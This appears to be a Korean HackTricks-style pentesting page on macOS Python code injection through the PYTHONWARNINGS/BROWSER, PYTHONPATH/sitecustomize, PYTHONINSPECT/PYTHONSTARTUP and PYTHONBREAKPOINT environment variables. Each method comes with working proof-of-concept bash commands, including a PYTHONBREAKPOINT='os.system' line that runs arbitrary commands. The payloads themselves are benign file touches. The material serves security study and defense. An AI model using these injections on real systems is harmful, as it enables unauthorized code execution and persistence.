# macOS Python 애플리케이션 인젝션

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` 및 `BROWSER` 환경 변수를 통한 방식

공격자가 Python 프로세스의 환경을 제어할 수 있다면, Python이 조작된 경고 옵션을 처리하는 동안 `antigravity` 모듈을 가져올 때 `PYTHONWARNINGS`와 `BROWSER`의 조합으로 명령 실행을 유발할 수 있습니다. 이 기법은 `antigravity`가 Python의 `webbrowser` 모듈로 URL을 열고, 이 모듈이 `BROWSER` 환경 변수를 따르는 점을 이용합니다.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## `PYTHONPATH` 및 `sitecustomize.py`를 통한 방법

정상적인 시작 과정에서 Python의 `site` 모듈은 사이트별 경로를 추가한 다음 `sitecustomize`라는 모듈을 가져오려고 시도합니다. 공격자가 프로세스 환경을 제어할 수 있는 경우, 공격자가 읽을 수 있는 디렉터리를 `PYTHONPATH`의 맨 앞에 배치하면 Python이 대상 스크립트보다 먼저 payload를 가져오게 할 수 있습니다. `-S` 플래그는 자동 `site` 초기화를 비활성화하며, 격리 모드(`-I`)는 `PYTHONPATH`를 무시하고 `-s`와 `-E`를 함께 적용합니다.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

사용자가 쓸 수 있는 site를 통한 persistence가 아니라 상속된 `PYTHONPATH`를 통한 persistence는 [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize)를 참조하세요.

## `PYTHONINSPECT`와 `PYTHONSTARTUP`을 통한 스크립트 실행 후 동작

CPython 3.13+에서는 `PYTHONINSPECT=1`로 실행한 스크립트가 종료되면 interactive session에 진입합니다. 표준 입력이 터미널이고 PyREPL을 사용할 수 있다면, 해당 session은 프롬프트가 표시되기 전에 대상 스크립트가 끝난 후 `PYTHONSTARTUP`으로 지정된 파일을 실행합니다. 따라서 상속된 두 변수를 모두 제어하고 startup file을 읽을 수 있는 공격자는 스크립트를 수정하지 않고도 대상 프로세스에서 코드를 실행할 수 있습니다. 이는 일반적인 startup hook이 아니라 스크립트 실행 후 트리거입니다.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

이 chain은 이전 CPython 버전에서는 startup file을 실행하지 않으며, 표준 입력이 터미널이 아니거나 `PYTHON_BASIC_REPL`이 basic REPL을 강제하는 경우에도 실행하지 않습니다. `-E`와 `-I`는 `PYTHON*` 변수를 무시합니다. 이 경로에 의존하기 전에 실제 interpreter와 terminal context를 확인하세요.<sup>[[3]](#references)[[5]](#references)</sup>

## `PYTHONBREAKPOINT`를 통한 방법

Python 3.7(PEP 553)부터 내장 함수 `breakpoint()`는 `sys.breakpointhook`이 가리키는 항목을 가져와 호출하며, 대상은 **`PYTHONBREAKPOINT`** 환경 변수(`package.module.callable`)에서 지정됩니다. 디버거가 일반적으로 나타나기 전에 지정된 module을 가져오고 callable을 호출하므로, `breakpoint()`에 도달하는 프로세스의 환경을 제어하는 공격자는 코드를 실행할 수 있습니다(유지보수/디버그 스크립트에서 흔히 발생하며, 프로덕션 경로에 남아 있는 경우도 있음).<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

`PYTHONWARNINGS`/`PYTHONPATH`와 달리, 이 방법은 대상이 실제로 `breakpoint()` 호출에 도달해야 합니다. 하지만 지정한 모듈의 **import 부작용**만으로도 동작합니다(가져올 수 있는 모듈이라면 무엇이든 지정할 수 있습니다. 예를 들어 `PYTHONPATH`에서 첫 번째로 검색되는 위치에 두고, 모듈 최상위 수준에서 코드를 실행하면 됩니다). `PYTHONBREAKPOINT=0`으로 설정하면 훅이 완전히 비활성화됩니다.



## References

- [1] [환경 변수를 이용한 해킹 - elttam](https://www.elttam.com/blog/env/)
- [2] [site — 사이트별 구성 훅](https://docs.python.org/3/library/site.html)
- [3] [Python 명령줄 및 환경](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 내장 breakpoint() 및 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython 인터프리터 REPL 디스패치 (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL 시작 파일 실행 (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
